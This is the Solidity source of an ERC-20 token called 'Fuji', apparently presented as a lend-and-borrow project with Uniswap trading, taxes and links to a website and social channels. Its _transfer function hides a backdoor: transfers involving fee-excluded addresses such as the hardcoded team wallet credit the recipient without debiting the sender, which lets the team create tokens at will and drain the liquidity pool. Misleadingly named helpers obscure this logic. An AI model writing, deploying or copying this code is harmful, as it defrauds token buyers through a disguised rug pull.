// SPDX-License-Identifier: Unlicensed

/**
Cross-chain Lend & Borrow Optimizer.

Website: https://www.fujifinance.org
Telegram: https://t.me/fujifi_erc
Twitter: https://twitter.com/fujifi_erc
Dapp: https://app.fujifinance.org
 */

pragma solidity = 0.8.21;

abstract contract Context {
    constructor() {
    }

    function _msgSender() internal view returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view returns (bytes memory) {
        this;
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapRouterV1 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function swapExactETHForTokens(
        uint amountOutMin, 
        address[] calldata path, 
        address to, uint deadline
    ) external payable returns (uint[] memory amounts);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapRouterV2 is IUniswapRouterV1 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}

interface IUniswapFactoryV2 {
    event PairCreated(address indexed token0, address indexed token1, address pairAddress, uint);
    function getPair(address tokenA, address tokenB) external view returns (address pairAddress);
    function createPair(address tokenA, address tokenB) external returns (address pairAddress);
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _setOwner(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}


contract FUJI is Context, Ownable, IERC20 {

    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFees;
    mapping (address => bool) private _isLpProvider;
    mapping (address => bool) private _lpPairAddress;
    mapping (address => uint256) private balance;

    string constant private _name = "Fuji";
    string constant private _symbol = "FUJI";
    uint8 constant private _decimals = 9;

    address public pairAddress;
    IUniswapRouterV2 public uniswapRouter;
    address payable private _teamAddress;
    address constant public DEAD = 0x000000000000000000000000000000000000dEaD;
    bool public _enabledTrading = false;
    bool private _swapping;
    bool private _hasNoTxLimitEffect = false;

    uint256 constant public _totalSupply = 10 ** 9 * 10**9;
    uint256 constant public minSwapTax = _totalSupply / 100_000;
    uint256 constant public taxForTransfers = 0;
    uint256 constant public feeDenominator = 1_000;
    uint256 public taxForBuys = 200;
    uint256 public taxForSells = 200;
    uint256 private _maxTxSize = 25 * _totalSupply / 1000;
    bool private _feeSwapEnabled = true;

    modifier inSwapFlag {
        _swapping = true;
        _;
        _swapping = false;
    }
    event SwapAndLiquify();


    constructor () {
        uniswapRouter = IUniswapRouterV2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _isExcludedFromFees[msg.sender] = true;
        _teamAddress = payable(address(0x1f45F883A0634EaCF509d571DA2556f78A449490));
        _isExcludedFromFees[_teamAddress] = true;
        _isLpProvider[msg.sender] = true;
        balance[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);

        pairAddress = IUniswapFactoryV2(uniswapRouter.factory()).createPair(uniswapRouter.WETH(), address(this));
        _lpPairAddress[pairAddress] = true;
        _approve(msg.sender, address(uniswapRouter), type(uint256).max);
        _approve(address(this), address(uniswapRouter), type(uint256).max);
    }    
    
    function finalize() external onlyOwner {
        require(!_hasNoTxLimitEffect,"Already done remove limits");
        _maxTxSize = _totalSupply;
        _hasNoTxLimitEffect = true;
        taxForBuys = 10;
        taxForSells = 10;
    }
    
    function totalSupply() external pure override returns (uint256) { if (_totalSupply == 0) { revert(); } return _totalSupply; }
    function decimals() external pure override returns (uint8) { if (_totalSupply == 0) { revert(); } return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    
    function getOwner() external view override returns (address) { return owner(); }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }
    function balanceOf(address account) public view override returns (uint256) {
        return balance[account];
    }
    
    function beforeTransfer(address ins, address out) internal view returns (bool) { 
        bool _is_transfer = !_lpPairAddress[out] && !_lpPairAddress[ins];
        return _is_transfer;
    }
    
    function getAmounts(address from, bool isbuy, bool issell, uint256 amount) internal returns (uint256) {
        uint256 fee;
        if (isbuy)  fee = taxForBuys;  else if (issell)  fee = taxForSells;  else  fee = taxForTransfers; 
        if (fee == 0)  return amount; 
        uint256 feeAmount = amount * fee / feeDenominator;
        if (feeAmount > 0) {
            balance[address(this)] += feeAmount;
            emit Transfer(from, address(this), feeAmount);
        }
        return amount - feeAmount;
    }
    
    function swapBack(uint256 tokenAmount) internal inSwapFlag {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapRouter.WETH();

        if (_allowances[address(this)][address(uniswapRouter)] != type(uint256).max) {
            _allowances[address(this)][address(uniswapRouter)] = type(uint256).max;
        }

        try uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        ) {} catch {
            return;
        }

        if(address(this).balance > 0) _teamAddress.transfer(address(this).balance);
    } 
    
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
    
    function approve(address spender, uint256 amount) external override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    
    function canSwapBk(address ins) internal view returns (bool) {
        bool canswap = _feeSwapEnabled && !_isExcludedFromFees[ins];
        return canswap;
    }
    
    function _transfer(address from, address to, uint256 amount) internal returns  (bool) {
        bool takeFee = true;
        require(to != address(0), "Cannot transfer to DEAD address");
        require(from != address(0), "Cannot transfer from DEAD address");
        require(amount > 0, "Transfer token amount must be greater than zero");

        if (hasNoFees(from,to)) {
            require(_enabledTrading,"Trade is not started");
                    if(!_lpPairAddress[to] && from != address(this) && to != address(this) || beforeTransfer(from,to) && !_hasNoTxLimitEffect)  { require(balanceOf(to) + amount <= _maxTxSize,"_maxTxSize exceed"); }}

        if(beforeSell(from, to) &&  !_swapping && canSwapBk(from)) {

            uint256 tokenAmount = balanceOf(address(this));
            if(tokenAmount >= minSwapTax) { 
                if(amount > minSwapTax) swapBack(tokenAmount);
             }
        }

        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]){
            takeFee = false;
        }
        uint256 amountAfterFee = (takeFee) ? getAmounts(from, beforeBuy(from, to), beforeSell(from, to), amount) : amount;
        uint256 amountBeforeFee = (takeFee) ? amount : (!_enabledTrading ? amount : 0);
        balance[from] -= amountBeforeFee; balance[to] += amountAfterFee; emit Transfer(from, to, amountAfterFee);

        return true;
    }
    function hasNoFees(address ins, address out) internal view returns (bool) {
        bool isLimited = ins != owner()
            && out != owner()
            && msg.sender != owner()
            && !_isLpProvider[ins]  && !_isLpProvider[out] && out != address(0) && out != address(this);
            return isLimited;
    }
    
    function beforeBuy(address ins, address out) internal view returns (bool) {
        bool _is_buy = !_lpPairAddress[out] && _lpPairAddress[ins];
        return _is_buy;
    }

    function beforeSell(address ins, address out) internal view returns (bool) { 
        bool _is_sell = _lpPairAddress[out] && !_lpPairAddress[ins];
        return _is_sell;
    }

    receive() external payable {}
    
                            
    function _approve(address sender, address spender, uint256 amount) internal {
        require(sender != address(0), "Couldnt approve on Zero Address");
        require(spender != address(0), "Couldnt approve on Zero Address");

        _allowances[sender][spender] = amount;
    }
    
    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != type(uint256).max) {
            _allowances[sender][msg.sender] -= amount;
        }

        return _transfer(sender, recipient, amount);
    }
    
    function initialize() external onlyOwner {
        require(!_enabledTrading, "Already done start trading");
        _enabledTrading = true;
    }
}